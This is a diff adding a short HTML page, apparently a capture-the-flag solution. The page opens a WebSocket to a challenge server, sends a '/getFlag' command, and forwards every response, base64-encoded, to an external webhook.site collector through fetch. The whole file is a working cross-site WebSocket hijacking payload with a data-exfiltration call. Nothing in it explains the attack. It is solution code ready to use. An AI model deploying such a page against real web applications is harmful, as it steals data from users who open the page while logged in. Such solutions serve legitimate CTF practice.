@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const ws = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
+  ws.onopen = () => {
+    ws.send(JSON.stringify({ message: "/getFlag" }));
+  };
+  ws.onmessage = (e) => {
+    fetch("https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?data=" + btoa(e.data));
+  };
+</script>
+</body>
+</html>
